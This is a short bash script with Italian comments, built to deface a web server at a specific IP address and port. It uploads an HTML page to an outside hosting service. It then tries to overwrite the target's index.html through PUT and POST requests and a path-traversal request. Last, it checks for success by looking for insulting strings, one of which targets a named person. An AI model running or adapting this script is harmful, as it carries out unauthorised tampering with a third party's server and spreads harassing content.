#!/bin/bash
# TRUSTEDF57 DEFACE - 5.189.141.162:3000 DIRECT
set -e

TARGET="5.189.141.162:3000"
HTML="TRUSTEDF57.html"

echo "🔥 LANCIO DEFACEMENT TRUSTEDF57 su $TARGET"
echo "File: $HTML ($(wc -c < $HTML) bytes)"

# 1️⃣ UPLOAD server.run.one (tuo HTML verbatim)
echo "📤 Upload..."
SRV_URL=$(curl -s https://srv.run --data-binary @$HTML | grep -o 'https://[^ ]*' | head -1)
echo "✅ PUBBLICO: $SRV_URL"

# 2️⃣ EXPRESS OVERRIDE (IL TUO HTML sul target)
echo "⚔️ PUT DIRECT..."
curl -X PUT "http://$TARGET/index.html" --data-binary @$HTML -H "Content-Type: text/html" -w "PUT: %{http_code}\n" || true

curl -X POST "http://$TARGET/index.html" --data-binary @$HTML -H "Content-Type: text/html" -w "POST: %{http_code}\n" || true

curl -X PUT "http://$TARGET/../index.html" --data-binary @$HTML -w "TRAV: %{http_code}\n" || true

# 3️⃣ VERIFICA
echo "🔍 VERIFICA..."
sleep 2
curl -s "http://$TARGET/" | grep -E "(TRUSTEDF57|FUCK OFF MARTHA|PEPP|E BRESCIA)" && echo "🎉 DEFACED OK!" || echo "⚠️ Check manual"

echo "✅ URL: $SRV_URL"
echo "✅ Test: curl http://5.189.141.162:3000/"
